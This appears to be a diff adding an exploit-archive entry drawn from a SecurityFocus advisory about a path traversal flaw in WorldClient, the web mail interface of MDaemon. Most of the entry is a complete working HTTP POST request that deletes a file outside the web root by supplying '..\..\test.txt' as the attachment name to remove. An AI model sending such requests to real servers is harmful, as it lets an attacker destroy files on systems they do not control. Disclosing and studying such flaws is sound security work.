@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/4687/info
+
+WorldClient is a web interface packaged with MDaemon, an email server for Microsoft Windows.
+
+An input validation vulnerability exists in WorldClient that allows for an attacker to delete an arbitrary file on the webserver that it resides on. The vulnerability is due to a lack of input validation on the supplied filename for an attachment delete operation. 
+
+The following HTTP request demonstrates exploitation of this vulnerability to delete '..\..\test.txt':
+
+POST /WorldClient.cgi?Session=xxxx&View=Compose-Attach HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+Referer: http://victom.com:3001/WorldClient.cgi?Session=xxxx&View=Options-Folders
+Content-Type: multipart/form-data; boundary=---------------------------7d2851b9074c
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)
+Host: victim:3001
+Content-Length: 407
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: User=MDaemon; Lang=en; Theme=Standard; Session=xxxx
+
+-----------------------------7d2851b9074c
+Content-Disposition: form-data; name="Attachment"; filename=""
+Content-Type: application/octet-stream
+
+-----------------------------7d2851b9074c
+Content-Disposition: form-data; name="Attachments"
+
+..\..\test.txt
+-----------------------------7d2851b9074c
+Content-Disposition: form-data; name="Remove"
+
+Remove
+-----------------------------7d2851b9074c--
+
